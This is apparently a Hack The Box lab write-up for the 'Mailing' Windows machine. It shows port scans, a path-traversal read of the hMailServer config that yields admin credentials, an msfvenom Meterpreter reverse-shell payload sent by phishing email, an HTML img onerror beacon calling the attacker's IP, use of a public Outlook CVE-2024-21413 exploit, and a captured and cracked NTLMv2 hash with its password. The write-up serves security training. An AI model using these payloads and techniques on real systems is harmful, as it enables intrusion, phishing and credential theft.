# Mailing Write-Up - HTB

## Recon

Starting off with an nmap scan:

```
Nmap scan report for 10.10.11.14
Host is up (0.047s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
51866/tcp open  unknown
```

Let's get a vulnerability overview:

{% code overflow="wrap" %}
```
PORTS=$(grep "open" all_syn.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -p $PORTS -Pn -n 10.10.11.14
```
{% endcode %}

```
Nmap scan report for 10.10.11.14
Host is up (0.095s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 IDLE OK CHILDREN completed ACL CAPABILITY NAMESPACE IMAP4 IMAP4rev1 QUOTA SORT
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: RIGHTS=texkA0001 IDLE OK CHILDREN completed ACL CAPABILITY NAMESPACE IMAP4 IMAP4rev1 QUOTA SORT
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51866/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-12T17:41:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Interesting ports: 25 (SMTP), 80 (HTTP), 110 (POP3), 143 (IMAP), 445 (SMB), 587 (SMTP) and possible 5040 and 7680.

I tried some SMTP basic capability enumeration. Navigated to the webpage on 80:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Checked the instructions and tried to replicate, but this "user" doesn't exist!

The download function is interesting though. In the mean-time I ran feroxbuster too:

```
feroxbuster -u http://mailing.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -k -n -t 100 -d 2 -o ferox_mailing_deep.txt
```

Let's see if we can do LFI through the download.php function!

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

From the ports opened we could see that this is a Windows box, so:

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Sweet! We can LFI!

```
GET /download.php?file=../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

```
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

I managed to get them working on Thunderbird as administrator@mailing.htb.

Now I am sending a malicious exe crafted with msfvenom to support (maya).

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=8888 -f exe -o shell.exe
```

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Hitting send...

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Now we wait...

Realizing that no one opens our attachments, so I tried with direct link in the mail:

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Although nobody opens the powershell... Let's see, by elimination we need some phish e-mail that will either launch direct revshell through browser, either hmm..

No creds coming back :(

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

It turns out this works:

```
<img src="http://10.10.16.9:8080/capture" style="display:none" onerror="fetch('http://10.10.16.9:9999/backup-capture')">
```

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Using the same idea I could enumerate some ports on the box:

```
2025-05-13 12:36:44,816 Connection established from ('10.10.11.14', 57048)
2025-05-13 12:36:44,996 Received message: {"type":"page_load","url":"http://10.10.16.9:9090/pl2.html","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"}
2025-05-13 12:36:45,121 Received message: {"type":"internal_fetch","url":"http://localhost/webmail/inbox","status":"success"}
2025-05-13 12:36:45,121 Received message: {"type":"internal_fetch","url":"http://localhost/admin/dashboard","status":"success"}
2025-05-13 12:36:45,121 Received message: {"type":"internal_fetch","url":"http://localhost/mail/inbox","status":"success"}
2025-05-13 12:36:45,301 connection open
2025-05-13 12:36:45,301 Connection established from ('10.10.11.14', 57056)
2025-05-13 12:36:45,384 Received message: {"type":"page_load","url":"http://10.10.16.9:9090/pl2.html","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"}
2025-05-13 12:36:45,426 Received message: {"type":"internal_fetch","url":"http://localhost/mail/inbox","status":"success"}
2025-05-13 12:36:45,426 Received message: {"type":"internal_fetch","url":"http://localhost/webmail/inbox","status":"success"}
2025-05-13 12:36:45,426 Received message: {"type":"internal_fetch","url":"http://localhost/admin/dashboard","status":"success"}
```

I realized this gets too much, it has to be something easier such as an outlook exploit.

Used:&#x20;

```
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Let's use this:

{% code overflow="wrap" %}
```
maya::MAILING:aaaaaaaaaaaaaaaa:d962644057be23cdda4b195e6a4dbc5d:010100000000000000d00af6f1c3db0188f18b06595c382600000000010010005200620054004c0057004e0052005a00030010005200620054004c0057004e0052005a00020010006f004600670049004800580051005500040010006f0046006700490048005800510055000700080000d00af6f1c3db0106000400020000000800300030000000000000000000000000200000402df535e6fdafb6ac31b195d1cd5bc20987b539cedf81a2c3e25113ac36c7810a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0039000000000000000000
```
{% endcode %}

Cracked with hashcat:

```
maya:m4y4ngs4ri
```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
